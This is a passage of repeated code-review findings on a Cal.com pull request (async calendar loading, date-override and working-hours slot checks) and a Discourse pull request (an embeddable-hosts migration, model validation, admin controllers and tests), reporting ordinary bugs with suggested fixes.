`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); return calendar?.deleteEvent(...) })` produces promises that nobody awaits or catches.

Previously a failure in `getCalendar` would throw synchronously and surface as a mutation error. Now any `getCalendar`, `deleteEvent` or `deleteMeeting` failure becomes an unhandled promise rejection, while the mutation continues sending emails and webhooks as if the deletes had succeeded.

Collect the promises with `map` and `await Promise.allSettled(...)`, logging any failures.

title: getCalendarCredentials creates getCalendar promises that are discarded for non-calendar variants
body:
`getCalendar(credential)` is now async and is called for every credential before the `app.variant === "calendar"` check. For apps whose type ends in `_calendar` but whose variant is not `"calendar"`, the returned promise is thrown away. If it rejects (for example a `CalendarService` constructor failing to decrypt a key), the rejection is never handled.

The returned `calendar` field also changes from `Calendar | null` to `Promise<Calendar | null>`. Every consumer of `getCalendarCredentials` must now await it, which is a silent contract change for callers other than `getConnectedCalendars`.

Only call `getCalendar` inside the `variant === "calendar"` branch.

title: import() calls run eagerly at module load, so nothing is lazy-loaded
body:
Each property value is `import("./xxx")`, and these calls run as soon as `packages/app-store/index.ts` is evaluated. Any route that pulls in `@calcom/app-store` therefore still starts loading all 28 app packages on cold start. Such routes include anything going through `videoClient`, `getCalendar`, `handlePayment`, `deletePayment` or `handleCancelBooking`.

The PR's goal of async, on-demand loading of apps is not achieved. Instead of reducing work, the change adds `await` overhead to every lookup.

There is a second effect. If an app module fails to load and nobody happens to await that specific entry yet, the rejection is an unhandled promise rejection at startup. On Node 15+ that can terminate the process.

Fix: store thunks, e.g. `applecalendar: () => import("./applecalendar")`, and call them at the lookup site, e.g. `await appStore[key]?.()`. Callers would need to handle missing keys.

title: async forEach makes the surrounding try/catch dead; getCalendar errors become unhandled rejections
body:
The callback was changed to `bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...) ... })`. `forEach` ignores the returned promises.

Before this PR, an exception from `getCalendar` was thrown synchronously and caught and logged by the enclosing `try { ... } catch`. Examples are `new CalendarService(credential)` failing on a malformed or undecryptable key, or an unsupported type. Now any such error rejects a promise nobody observes. It surfaces as an unhandled promise rejection instead of being logged, and on Node 15+ that may crash the process.

The calendar and video deletions are also never awaited, so `Reschedule` returns before they finish.

Fix: use `await Promise.all(bookingRefsFiltered.map(async (ref) => ...))` inside the try block, or `Promise.allSettled` with per-item logging.

title: async forEach makes the surrounding try/catch dead; getCalendar errors become unhandled rejections
body:
This file has the same change as the vital reschedule: `bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...) })` inside a `try/catch`.

Because `forEach` discards the async callbacks' promises, an error thrown while resolving or constructing the calendar service is no longer caught by the `catch` block. Previously it was thrown synchronously and logged. Now it becomes an unhandled promise rejection.

The deletions also run fire-and-forget, so the function returns `true` before they complete.

Fix: replace with `await Promise.all(bookingRefsFiltered.map(async ...))` (or `allSettled`) inside the try.

title: requestReschedule: async forEach swallows getCalendar failures into unhandled rejections
body:
`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); return calendar?.deleteEvent(...) })` discards every callback promise.

Before this PR, a synchronous failure in `getCalendar` (e.g. a CalendarService constructor throwing on a bad credential) failed the tRPC mutation with an error. Now it is an unobserved promise rejection: the mutation reports success, and the process gets an unhandled rejection.

The calendar and video deletions are also not awaited before the mutation sends emails and webhooks and returns. In serverless execution they may never complete.

Fix: use `await Promise.all(bookingRefsFiltered.map(async ...))`, or `allSettled` with logging if failures should not block the reschedule.

title: getCalendarCredentials creates calendar promises that are discarded for non-'calendar' variants
body:
`getCalendar(credential)` now returns a Promise. It is still invoked for every credential of every `_calendar` app, before the `app.variant === "calendar"` check. For apps whose variant is not "calendar" (e.g. `*_other_calendar` CRMs), the promise is created and thrown away. If it rejects (e.g. the service constructor throws on the stored key), nobody handles it and it becomes an unhandled promise rejection.

The exported return shape also changed: `calendar` is now a `Promise<Calendar | null>` instead of a `Calendar | null`. Any consumer other than `getConnectedCalendars` that uses `item.calendar` directly will silently break.

Fix: only call `getCalendar` inside the `variant === "calendar"` branch, or resolve it lazily inside `getConnectedCalendars`.

title: Slots on a date-override day skip the busy-time check, allowing double bookings
body:
When the slot's day has a date override and the slot passes the range checks, `checkIfIsAvailable` hits `if (dateOverrideExist) return true;`. That returns before `busy.every(...)` runs.

On any day with a date override, the user's existing Cal bookings and connected-calendar busy times are therefore ignored. All users of a non-team event count as fixed hosts, so this affects personal event types too, not only round-robin. Invitees can book slots that overlap existing bookings or calendar events.

Only the working-hours check should be skipped when an override exists. The busy check must still run.

title: Working-hours check rejects every slot when a user has more than one working-hours entry for a day
body:
`workingHours.find(...)` returns true, and the slot is rejected, if the slot falls outside ANY working-hours entry that includes the slot's UTC weekday. It should only reject when the slot is inside none of them.

`getWorkingHours` splits ranges that cross UTC midnight into two entries with shifted `days`. Example: a PST user working Mon–Fri 9–17 gets {days 1–5, 1020–1439} and {days 2–6, 0–60}.
- A Tuesday 18:00Z slot fits the first entry but is outside the second, so it is rejected.
- A Tuesday 00:30Z slot is rejected by the first entry.

Result: organizers in most western-hemisphere timezones lose almost all Tue–Fri availability. Users with split schedules (e.g. 9–12 and 13–17 on the same day) lose all slots on those days.

The logic should accept a slot that fits within at least one applicable entry.

title: Slot end used for the working-hours check is computed from the slot start
body:
`const end = slotStartTime.hour() * 60 + slotStartTime.minute();` is identical to `start`. The intended `end > workingHour.endTime` check therefore only tests the slot's start.

A slot that starts inside working hours but runs past their end is accepted. For example, a 60-minute event at 17:30 with working hours ending at 18:00 passes. This should use `slotEndTime`, taking care with slots that end exactly at midnight.

title: Multiple date-override ranges on the same day reject all slots
body:
`dateOverrides.find` returns true, and the slot is marked unavailable, as soon as ANY override on the slot's day doesn't contain the slot.

Date overrides support several time ranges per day (e.g. 9–10 and 14–15). A slot in the first range is outside the second, and vice versa, so every slot on that day is rejected for the fixed host. The check should reject only when the slot is outside ALL override ranges for that day.

title: Override range check accepts slots that only partially overlap the override
Dayjs objects compared with `===`, so the 'unavailable all day' branch never runs
body:
`dayjs(date.start).add(...) === dayjs(date.end).add(...)` compares two freshly created object references, so it is always false. Overrides that mark a day unavailable (start == end) never take this early-reject path.

The later checks miss a slot starting exactly at the override instant (midnight in the organizer's zone), because `slotStartTime.isAfter(end)` is false for equal times. Since `dateOverrideExist` is then true, the function returns true and also skips the busy check. A slot at midnight on a day the host marked unavailable can therefore be offered. Use `.isSame(...)` or compare `valueOf()`.

title: Override day is matched by UTC calendar day instead of the organizer's local day, and formatted in server-local time
body:
The code checks whether the slot is on the override's day by comparing the UTC date of the override's real start instant with the slot's UTC date. A date override covers a calendar day in the organizer's timezone.

Example: a PST organizer sets an override for day D 16:00–20:00, i.e. D+1 00:00Z–04:00Z. The real start falls on UTC day D+1.
- Slots during the organizer's day D (e.g. D 17:00Z = 09:00 PST) don't match, so normal working hours apply and they are wrongly offered.
- Slots on UTC day D+1 (a normal day for the organizer) match and are wrongly rejected as outside the override.

Separately, `dayjs(date.start).add(...).format(...)` formats in the server's local timezone, while `slotStartTime` is in UTC. The comparison also breaks on any server not running in UTC.

The slot should be converted to `organizerTimeZone` and its local date compared with the override's date.

title: Timezone-shifted overrides that cross invitee midnight are silently dropped
body:
The shifted start/end are reduced to `hour()*60 + minute()`, which discards the day.

If shifting by `inviteeOffset - organizerOffset` pushes the override across the invitee's midnight, `endTime` wraps below `startTime`. Example: a UTC override 16:00–22:00 for an IST invitee becomes 21:30 → 1290 and 03:30 → 210.

`buildSlots` skips any boundary with `start >= end`, so the whole override vanishes. The user's working hours for that day have already been removed, so the invitee sees no slots at all from that host. The range needs to be split at midnight, or clamped to the invitee's day.

title: Active-override day selection still uses the naive organizer wall time, so the new offset is applied to the wrong invitee day
body:
`override.start` holds the organizer's wall-clock time stored as UTC. The filter `dayjs.utc(override.start).isBetween(startOfInviteeDay, ...)` compares that naive value with real instants of the invitee's day, without converting it.

Example: an IST override on D 15:00–18:00 (real D 09:30Z = 19:30 Brisbane on D). For a Brisbane (+10) invitee the naive D T15:00Z falls in invitee day D+1.
- The shifted 19:30–22:30 window is shown on D+1.
- The host's normal working hours are removed on D+1.
- Day D keeps the normal working hours.

The PR's timezone fix is incomplete without converting `override.start` to a real instant, using `override.timeZone`, before this day filter.

title: Missing override timeZone silently falls back to the server's local timezone
body:
`TimeRange.timeZone` is optional. When it is undefined, `dayjs(...).tz(override.timeZone)` resolves to the process's local zone rather than UTC.

Any caller of `getSlots` that passes overrides without `timeZone` now gets them shifted by `inviteeOffset - serverLocalOffset`. Previously they were used as-is, so results now depend on the server or client machine timezone. Either require `timeZone` or skip the shift when it is absent.

title: Tests don't cover the round-robin fixed-host fix or the new checkIfIsAvailable paths
Slots on a date-override day skip the busy-time check, allowing double bookings
body:
When a date override matches the slot's day and the slot is not rejected by it, `checkIfIsAvailable` hits `if (dateOverrideExist) return true;` and returns before `busy.every(...)` runs.

Busy times (existing Cal bookings and external calendar events) are only checked in this function. So on any day with a date override, a host's bookings and calendar conflicts are ignored and already-booked slots are offered again.

This is not limited to round-robin. Personal event types also go through the `fixedHosts.every(...)` path, because `isFixed` is true when there is no `schedulingType`. Every user with a date override can be double-booked on that day.

The override check should only reject slots; the busy check must still run afterwards.

title: Working-hours check rejects a slot if it falls outside ANY range for that weekday
body:
`workingHours.find(...)` returns a match as soon as one working-hour entry for the slot's weekday does not contain the slot, and the slot is then marked unavailable. A slot should only be rejected if it is outside all ranges for that day.

This breaks two common cases:
- Users with split hours on the same day (e.g. 9–12 and 13–17). A 10:00 slot is outside 13–17, so it is rejected.
- Users whose local hours cross UTC midnight. `getWorkingHours` splits these into two entries with overlapping day sets. For Mon–Fri 9–17 in America/Los_Angeles you get `{days:[1..5], 960–1439}` and `{days:[2..6], 0–0}`. Every Tue–Fri slot is then outside the second entry and rejected.

This runs for every fixed host, including the single host of every personal event type. Most users in US timezones would lose most of their availability. The check should test that the slot is inside some range for that day (or be removed, since `getSlots` already generates slots only within working hours).

title: Working-hours 'end' is computed from the slot start instead of the slot end
body:
`const end = slotStartTime.hour() * 60 + slotStartTime.minute();` is identical to `start`. As a result, `end > workingHour.endTime` never catches slots that start inside working hours but run past the end.

It should be derived from `slotEndTime`. Midnight wrap-around also needs handling: slotEndTime may fall on the next UTC day, where hour*60+minute is small.

title: Override end check uses slot start, so slots extending past the override end are accepted
body:
The slot is only rejected when `slotStartTime.isAfter(overrideEnd)`.

With an override ending at 18:00 and a 60-minute event:
- a 17:30 slot (ending 18:30) passes;
- an 18:00 slot also passes, because `isAfter` is false when the times are equal.

The point of this change is to enforce a fixed host's override in round-robin events, so slots that end after the override end should be rejected. Compare `slotEndTime` against the override end instead (`isAfter`).

title: Dayjs objects compared with ===, so the 'unavailable all day' branch never fires
body:
`dayjs(date.start).add(...) === dayjs(date.end).add(...)` compares two freshly created object references and is always false. The intended detection of a zero-length ("unavailable") override never triggers.

The later checks do not fully cover it. A slot starting exactly at the override instant is neither before start nor after end. It sets `dateOverrideExist = true` and is returned as available, which also bypasses the busy check.

Use `.isSame(...)` or compare `valueOf()` instead.

title: Override day matching uses server-local formatting and UTC calendar days instead of the organizer's local day
body:
There are two problems with how the override's day is matched to the slot.

First, the format calls disagree on timezone. `dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` formats in the server process's local timezone, while `slotStartTime` is `.utc()`. On a server not running in UTC, the dates can mismatch.

Second, even on UTC servers the logic compares the UTC calendar date of the real override start with the UTC date of the slot. An organizer's local override day usually spans two UTC dates. For a PST organizer with an override on day D:
- slots on UTC date D that belong to local day D-1 (evening hours) are treated as part of the override day and wrongly rejected;
- override slots that fall on UTC date D+1 are not recognized as override slots and fall through to the working-hours check.

Matching should be done on the organizer-local date of the slot (e.g. `slotStartTime.tz(organizerTimeZone)`) against the override's date.

title: Converted override wraps around midnight and is dropped, leaving the day with no slots
body:
The override is shifted into the invitee timezone and reduced to `hour()*60+minute()`, which wraps modulo a day.

If the shifted range crosses invitee midnight, startTime > endTime. For example, an IST 14:00–18:00 override seen from Pacific/Auckland becomes 21:30–01:30. A shifted end of exactly midnight becomes 0.

`buildSlots` skips ranges with `start >= end`. Because the user's working hours for that day were already spliced out in favor of the override, the invitee sees no slots at all that day, and the portion on the next invitee day is never produced.

The override needs to be split across invitee days, or the end clamped to 1440, rather than computed modulo 24h.

title: Missing override timeZone silently falls back to the runtime's local timezone
body:
`TimeRange.timeZone` is declared optional. When it is absent, `dayjs(...).tz(override.timeZone)` gets `undefined` and the dayjs tz plugin uses the default/system local timezone.

In that case the organizer offset is computed against the client or server machine's timezone instead of the organizer's, and override slots are shifted incorrectly without any error. Any caller of `getSlots` that does not attach `timeZone` gets wrong results.

Fall back explicitly to `organizerTimeZone`, which is already a parameter, or make the field required.

title: No tests for the main fix or for the new availability checks' edge cases
Per-user working-hours check rejects slots whenever a user has more than one working-hours entry for a day
body:
`workingHours.find(...)` returns true, meaning the slot is rejected, as soon as any single entry covering that weekday does not contain the slot. It does not check whether at least one entry contains it.

Users routinely have several entries for the same day:
- Split availability, e.g. 9-12 and 13-17.
- Hours that cross UTC midnight, which `getWorkingHours` splits into two entries with shifted `days`. For example, US Pacific 9am-6pm becomes ~16:00-24:00 UTC plus 00:00-01:00 UTC.

A 14:00 slot is outside the 9-12 entry and gets rejected. Each Pacific-time slot is outside one of its two UTC fragments, so every slot is rejected.

This check now runs for every fixed host. For non-team event types every user is `isFixed`, so personal booking pages for these users lose most or all of their slots. The logic should require the slot to be inside at least one applicable range (`some`), not reject it if it is outside any one range.

title: Busy times are skipped entirely on days with a date override
body:
When a date override matches the slot's day and the slot is not rejected, `if (dateOverrideExist) return true;` returns before the `busy.every(...)` check runs.

On any day with a date override, the user's existing Cal bookings, external calendar events and buffers are therefore ignored. Slots that overlap them are shown as available, for both fixed and round-robin hosts, inviting double bookings or failures at booking time.

The override and working-hours checks should only reject slots; slots that pass them should still go through the busy check.

title: Multiple date-override ranges on the same day reject slots inside any range but the first
body:
`dateOverrides.find(...)` returns true, so the slot is marked unavailable, as soon as one override on that day does not contain the slot. Cal.com lets a date override have several time ranges, e.g. 9-10 and 14-15.

A 14:00 slot is checked against the 9-10 override first. `slotStartTime.isAfter(end)` is true, so the slot is rejected even though it lies within the 14-15 range.

The check should reject a slot only if it falls inside none of that day's override ranges.

title: Override day matching uses the UTC (or server-local) date instead of the organizer's local date
body:
The override is matched to a slot by comparing `dayjs(date.start).add(utcOffset).format("YYYY MM DD")` with `slotStartTime.format("YYYY MM DD")` in UTC. Two problems follow.

1. Wrong day for non-UTC organizers. An IST user marking Apr 17 unavailable (stored as 00:00-00:00) produces start = Apr 16 18:30Z. Slots on Apr 17 UTC, i.e. the fixed host's whole IST working day, never match the override and fall through to the working-hours check, so they are shown as bookable. That defeats the purpose of this PR for fixed hosts. In the other direction, a slot at Apr 17 20:00Z (Apr 18 01:30 IST) is compared against the Apr 17 override and wrongly rejected.

2. Server timezone dependence. The left side is formatted in the server's local timezone while the right side is UTC, so results change on servers not running in UTC.

Matching should compare the slot's date in the organizer's timezone with the override's organizer-local date.

title: Slots that only partially overlap a date override are accepted
body:
A slot is rejected only if it ends at or before the override start, or starts after the override end.

This lets through slots that straddle either boundary:
- With override 14:00-15:00 and a 60-minute event, a 14:30 slot ends at 15:30 but is accepted because its start is not after 15:00.
- A 13:30 slot that starts before the override is also accepted.

Bookings can therefore extend outside the host's overridden availability. The check should require `slotStart >= overrideStart && slotEnd <= overrideEnd`.

title: Working-hours end check uses slot start time instead of slot end time
body: `const end = slotStartTime.hour() * 60 + slotStartTime.minute();` is identical to `start`, so the slot's end is never checked. A slot that starts inside working hours but runs past the end of the working day is not rejected. This looks like a copy-paste error; it should use `slotEndTime`.

title: Identity comparison of two dayjs objects is always false
body:
`dayjs(date.start).add(...) === dayjs(date.end).add(...)` compares two freshly created object references, so it is never true. The intended "unavailable all day" (start == end) short-circuit never fires.

A slot starting exactly at the override instant then passes both later checks: its end is not before start, and its start is not after end. It is treated as inside the override and shown as available on a day marked unavailable. Use `isSame`/`valueOf()` comparison instead.

title: Override-to-invitee timezone shift wraps across midnight and drops or misplaces override slots
body:
Override start/end are shifted by `inviteeOffset - organizerOffset` and reduced to `hour()*60 + minute()`. That arithmetic wraps modulo 24h without moving the range to the adjacent invitee day.

For an IST organizer with an override of 06:00-18:00 and an invitee in New York (offset -9:30), start becomes 20:30 (1230 min) and end becomes 08:30 (510 min). `buildSlots` discards the range as start >= end. The organizer's regular working hours for that day were already removed, so the invitee sees no slots that day.

The `activeOverrides` day filter also compares the organizer-wall-clock `override.start` against invitee-day instants without the offset. Overrides near midnight can be applied to the wrong invitee day. The conversion needs to work on absolute instants and handle ranges that span two invitee days.

title: New tests don't cover the round-robin fixed-host fix or the new checkIfIsAvailable logic
body:
The only added test re-runs the single-user override scenario in another timezone. Nothing exercises the PR's main change: a round-robin event with a fixed host whose date override must constrain slots.

The following are also untested:
- Bookings or busy calendar time on a date-override day.
- Multi-range overrides.
- Working hours with split ranges or ranges crossing UTC midnight.
- "Unavailable" (00:00-00:00) overrides for a non-UTC host.

The existing IST 9:30-18:00 fixture maps to a single UTC range and a single override, so serious regressions in `checkIfIsAvailable` pass unnoticed: whole-day loss of slots, skipped busy times, and wrong day matching.

title: Migration crashes when no embed_category setting row exists
body: The query joining `categories` to `site_settings` on `name = 'embed_category'` returns no rows when `embed_category` was never set. That is the default (`''` is not persisted), it is the state on every fresh install, and it also happens when the stored name no longer matches a category. Calling `[0]` on an empty PG::Result raises IndexError (and even if it returned nil, `['id']` would raise NoMethodError). So `rake db:migrate` aborts for most existing sites and all new installs. The `category_id == 0` fallback is never reached. Check `ntuples`/`cmd_tuples` before indexing.

title: Migrated hosts are not normalized, silently breaking existing embeds
body:
The old `allows_embeddable_host?` explicitly accepted entries like `http://eviltrout.com` and `https://...`; there were specs for this. The migration inserts each line of `embeddable_hosts` verbatim. It does not strip the scheme, path, whitespace or `\r` (CRLF input), and it does not skip blank lines.

The new lookup compares `lower(host)` against the bare `uri.host`. Rows such as `http://eviltrout.com` or `eviltrout.com\r` therefore never match. After upgrading, those sites get `InvalidAccess` on every embed request and TopicRetriever stops importing. Hosts should be normalized the same way the model's `before_validation` does, or inserted via the model.

title: Raw string interpolation into INSERT SQL
body: Each host value is interpolated directly into `VALUES ('#{h}', ...)` without quoting or escaping. Any stored value containing a single quote makes the migration fail with a SQL syntax error, and in general this is an injection-prone pattern. Use `ActiveRecord::Base.connection.quote(h)` or bind parameters.

title: before_validation crashes with NoMethodError when host is nil
body: `self.host.sub!(...)` is called unconditionally. When `host` is nil, `valid?`/`save` raises NoMethodError instead of returning a validation error. This happens for `EmbeddableHost.new` without a host, or when the admin controller receives a request without `embeddable_host[host]`; the result is a 500 error. Guard with `if host.present?` (and add a presence validation).

title: Case-insensitive lookup only lowercases one side
body: `where("lower(host) = ?", host)` lowercases the stored column but not the input. Ruby's `URI#host` preserves case, so a referer or `embed_url` with uppercase letters (e.g. `http://EvilTrout.com/...`, which can come from the user-supplied `embed_url` param to TopicRetriever) will never match. Use `host.downcase` for the bound value.

title: Host format validation rejects valid TLDs longer than 5 characters
body: The regex requires the TLD to match `[a-z]{2,5}`. This rejects many real domains such as `.museum`, `.travel`, `.digital` and `.technology`, as well as `localhost` and IP addresses. Admins cannot add these hosts through the new UI, although the previous free-form site setting accepted them. Hosts migrated via raw SQL in that format can never be edited and re-saved either.

title: Hosts saved with a port can never match
body: The validation explicitly allows an optional `:port`, and `before_validation` only strips the scheme and path, so `example.com:8080` is stored as is. `record_for_host` compares against `URI#host`, which never includes the port. Such a record is accepted by the UI but never authorizes any referer.

title: update/destroy raise 500 for unknown ids
body: Both `update` and `destroy` use `EmbeddableHost.where(id: params[:id]).first`, which returns nil for a missing id. `save_host(nil)` / `host.destroy` then raise NoMethodError, producing a 500 instead of a 404. This happens with a stale UI or a double-delete. Use `find` or raise `Discourse::NotFound` when the record is nil.

title: Category badge is cleared when no category is chosen
body: When the admin saves without choosing a category, `categoryId` is null. The server substitutes `uncategorized_category_id`, but the client sets `host.category` to `Discourse.Category.findById(null)`, which is undefined. The row shows no category until the page is reloaded. Use the `category_id` returned in the save response instead of the local `categoryId`.

title: Array hydration leaves undefined entries and crashes on null
body: For `*_ids` keys the code maps every id through `_lookupSubType`, which returns undefined when an id is not present in the sideloaded collection. The resulting array can contain undefined holes, so templates that iterate it (e.g. `embeddable-host` components) break. If the value is null, `obj[k].map` throws. The `hydrated || []` fallback does nothing because `map` always returns an array. Filter out missing entries and guard against non-array values.

title: find-embedded test passes only because the fixture ignores the id
body: The test fetches `store.find('fruit', 2)` (banana, `color_ids: [3]`) but asserts two colors with ids 1 and 2. It passes only because the Pretender handler for `/fruits/:id` always returns `fruits[0]` (apple). The test does not check what it appears to, and it would fail if the fixture were fixed to respect the id.

title: Test name no longer matches the behavior under test
body: `expandable_first_post?` no longer depends on embeddable hosts at all, since the `embeddable_hosts.present?` check was removed. The spec "is false if embeddable_host is blank" now passes only because `embed_truncate` defaults to false and the topic has no embed. The `Fabricate(:embeddable_host)` in the nested before block is irrelevant. The spec gives false confidence about a host-based condition that no longer exists.

title: New admin endpoints have no behavioral tests
body: The specs for `Admin::EmbeddableHostsController` and `Admin::EmbeddingController` only assert the class hierarchy. Nothing tests create/update/destroy, the defaulting of `category_id` to uncategorized, validation-error responses, or the serialized embedding payload. The bugs these specs would catch (nil handling, missing records) go undetected.

title: Fabricator definitions are in each other's files
body: `category_fabricator.rb` now defines only `Fabricator(:embeddable_host)`, and the new `embeddable_host_fabricator.rb` holds all the category fabricators. It works because every fabricator file is loaded, but anyone looking for the category fabricators in `category_fabricator.rb` won't find them. The two files' contents should be swapped.

title: No integrity between embeddable hosts and categories; duplicates allowed
body:
`category_id` is NOT NULL, but there is no foreign key, no validation that the category exists, and no cleanup when a category is deleted. Hosts can end up pointing at nonexistent categories: the admin UI badge is blank and imports silently go to uncategorized.

There is also no uniqueness validation or index on `host`. Duplicate rows can be created, and `record_for_host` then picks an arbitrary one with `.first`, making the target category nondeterministic.

title: Migration crashes when embed_category (or uncategorized_category_id) has no row
body:
The migration runs `execute(...)[0]['id']` on the join of `categories` and `site_settings` where `name = 'embed_category'`. `site_settings` only stores non-default values, and `embed_category` defaults to `''`, so on most installs the query returns zero rows. `PG::Result#[0]` on an empty result raises an IndexError ("Index 0 is out of range").

The fallback lookup of `uncategorized_category_id` on line 15 has the same problem on a fresh database, where no site_settings rows exist yet.

Result: `rake db:migrate` aborts on fresh installs and on any existing site that never set `embed_category`, which blocks the upgrade. Check `ntuples`/`cmd_tuples` before indexing, or use `.first` with nil handling.

title: Migrated hosts are not normalized, so existing scheme-prefixed hosts silently stop matching
body:
The old `allows_embeddable_host?` accepted entries like `http://eviltrout.com` or `https://eviltrout.com`; it parsed them with `URI(h).host`, and the removed specs covered exactly this. The migration inserts each raw line verbatim with no scheme or path stripping and no trimming of whitespace or `\r` (it only splits on "\n"). It also bypasses the model's `before_validation` normalization.

`EmbeddableHost.record_for_host` then compares `lower(host)` against the bare `uri.host` (e.g. `eviltrout.com`). Any migrated entry that has a scheme, path, surrounding whitespace or a CRLF line ending never matches. Those sites lose embedding with no error after upgrading.

Strip `^https?://`, any path, and whitespace from each record before inserting it.

title: Host values are string-interpolated into raw SQL
body: `execute "INSERT ... VALUES ('#{h}', ...)"` puts the site setting value directly into SQL without quoting. Any host string containing a single quote (or other SQL metacharacters) breaks the migration or injects arbitrary SQL. The value comes from admin input, but a migration should not trust stored data this way. Use `ActiveRecord::Base.connection.quote(h)` or a parameterized insert.

title: Host validation rejects many legitimate hosts
before_validation raises NoMethodError when host is nil
body: `self.host.sub!(...)` is called unconditionally. If `host` is nil — for example `EmbeddableHost.new.valid?`, or a create/update request without `embeddable_host[host]` — this raises NoMethodError and returns a 500 instead of a validation error. Guard with `if host.present?` or use `self.host = host.to_s.sub(...)`.

title: Hosts saved with a port can never match
body:
The validation regex explicitly allows a `:port` suffix, and `before_validation` strips only the scheme and path, so `example.com:8080` is stored as-is. `record_for_host` compares the stored value with `uri.host`, which never includes the port. Such entries are accepted by the UI but never allow embedding.

Relatedly, the stored value is lowercased in SQL but the argument is not. Ruby's `URI#host` preserves case, so a mixed-case referer host will not match. Either strip/compare ports consistently or reject ports, and downcase the argument.

title: update/destroy raise 500 when the record is missing
body: Both `update` and `destroy` use `EmbeddableHost.where(id: params[:id]).first` and then call methods on the result. When the id does not exist (for example, deleted in another tab), `save_host(nil)` or `nil.destroy` raises NoMethodError and the client gets a 500. Use `find` or `find_by!`, or raise `Discourse::NotFound`.

title: category_id is not validated to exist
body: Any `category_id` sent by the client is stored without checking that the category exists, and the model has no validation on the association. A bogus or later-deleted category id leaves a dangling reference. The admin list then shows an empty category badge, and imported topics silently fall back to uncategorized because TopicCreator cannot find the category.

title: Plural `_ids` hydration always deletes the ids and can crash on null
body:
For singular `_id` keys, the original id is kept unless a hydrated object is found. The new plural branch behaves differently:
- It unconditionally `delete obj[k]` and replaces it with `obj[pluralize(subType)]`, an array of `_lookupSubType` results.
- When the payload has no side-loaded collection for that subtype, the array is full of `undefined` and the original ids are lost. This affects any existing `__rest_serializer` payload with an `*_ids` field such as `user_ids` or `group_ids`.
- If the value is `null`, `obj[k].map` throws a TypeError.
- The `hydrated || []` fallback is dead code, because `map` always returns an array.

Only replace the field when the lookups succeed, and guard against non-array values.

title: Feed-imported topics lose their category when the article host is not registered
body: Previously every imported topic went to `SiteSetting.embed_category`. Now the category comes from the `EmbeddableHost` matching the article URL's host. Feed-polled articles whose links point to a host not in the table (e.g. feed on `feeds.example.com`, articles on `blog.example.com`) get `category: nil` and land in uncategorized. Existing feed setups can silently change behaviour after upgrade.

title: Client shows no category after saving without choosing one
body: If the admin saves without picking a category, `categoryId` is null. The server substitutes `SiteSetting.uncategorized_category_id`, but the client sets `host.category` to `Discourse.Category.findById(null)`, which is undefined. It ignores the `category_id` returned in the response. The row shows no category badge until the page is reloaded.

title: Delete failures are silently swallowed
body: `destroyRecord().then(...)` has no `.catch(popupAjaxError)`, unlike `save`. If the DELETE request fails (403, 500, network error), the admin gets no feedback and the row stays with no indication of what happened.

title: Fabricator file contents are swapped
body: `category_fabricator.rb` now defines only the `:embeddable_host` fabricator. The new `embeddable_host_fabricator.rb` contains all the category fabricators (`:category`, `:diff_category`, `:happy_category`, `:private_category`). It works only because all fabricators are loaded globally, but anyone looking for the category fabricators will find them in the wrong file. Swap the contents back.

title: Test name no longer matches what it tests
body: `expandable_first_post?` no longer looks at embeddable hosts. The test "is false if embeddable_host is blank" passes only because `embed_truncate` defaults to false and there is no TopicEmbed. Likewise, `Fabricate(:embeddable_host)` in the nested context has no effect on the result. The spec suggests behaviour the code no longer has. It also hides the behaviour change: topics are now expandable even when no hosts are configured.

title: 'find embedded' test requests fruit 2 but asserts fruit 1's data
body: The test calls `store.find('fruit', 2)` (banana, `color_ids: [3]`) and asserts two colors with ids 1 and 2, which are apple's colors. It passes only because the pretender `/fruits/:id` handler always returns `fruits[0]`. If the stub ever honours the id, the test breaks, and as written it does not check that the requested record is the one hydrated.

title: No tests for create/update/destroy of embeddable hosts
Migration crashes when `embed_category` was never set
body:
The migration reads the existing category with `execute("SELECT c.id ... WHERE s.name = 'embed_category'")[0]['id']` and does not check whether any row came back.

Site settings are only written to `site_settings` when changed from their default. `embed_category` defaulted to `''`, so on fresh installs and on most existing sites this query returns zero rows. Indexing row 0 of the empty `PG::Result` then raises, which aborts the migration.

The result is that upgrades, new installs and test DB setup all fail. Check that a row exists before reading `['id']`, and fall back to the uncategorized category otherwise.

title: Migrated hosts are inserted raw, so previously valid configs stop matching
body:
Each line of the old `embeddable_hosts` setting is inserted verbatim with `VALUES ('#{h}', ...)`. This skips the model's `before_validation` normalization.

The old `SiteSetting.allows_embeddable_host?` accepted entries such as `http://eviltrout.com` and `https://example.com/1234`; the removed specs explicitly covered these. After migration those values are stored with scheme and path intact. `EmbeddableHost.record_for_host` compares them against the bare `uri.host`, so embedding silently stops working for those sites after upgrade.

The raw insert has other problems too:
- Blank lines insert empty-string hosts.
- `\r` from CRLF input is kept in the stored value.
- A value containing a single quote breaks the SQL statement.

Strip the scheme, path and whitespace, skip blank entries, and quote the values (or insert through the model).

title: `before_validation` raises NoMethodError when host is nil
body:
`self.host.sub!(...)` is called unconditionally. If `host` is nil, validation raises NoMethodError instead of failing with a validation error.

This happens in `Admin::EmbeddableHostsController#save_host` whenever the request has no `embeddable_host[host]` param, which turns a bad request into a 500. The client-side `cantSave` guard does not protect API callers.

Guard with `if host.present?`, or add `validates_presence_of :host`.

title: Host lookup lowercases only the column, and port-qualified hosts never match
body:
`where("lower(host) = ?", host)` lowercases the stored column but not the argument. Ruby's `URI#host` does not downcase, so an embed URL such as `http://EvilTrout.com/x` (for example from TopicRetriever's raw `embed_url` param) never matches. Use `host.downcase`.

Separately, the format validation accepts an optional `:port`, so `example.com:8080` can be saved. The lookup compares only `uri.host`, which never includes the port, so such a record validates but can never authorize anything.

title: Host validation rejects valid hostnames
body:
The regex requires a TLD of 2–5 letters (`\.[a-z]{2,5}`). This rejects many valid domains, such as `.museum`, `.travel`, `.software` and `.photography`, as well as `localhost` and IP addresses. The old `host_list` setting accepted all of these.

Admins cannot add such hosts through the new UI. Hosts migrated with these TLDs cannot be re-saved after editing.

title: update/destroy crash with 500 on unknown id
body:
`EmbeddableHost.where(id: params[:id]).first` returns nil for a nonexistent id. The next call, `save_host(host)` (line 11) or `host.destroy` (line 16), then raises NoMethodError.

The client gets a 500 instead of a 404. Use `EmbeddableHost.find(params[:id])` or raise `Discourse::NotFound`.

title: `_ids` hydration crashes on null, keeps undefined entries, and always deletes the key
body:
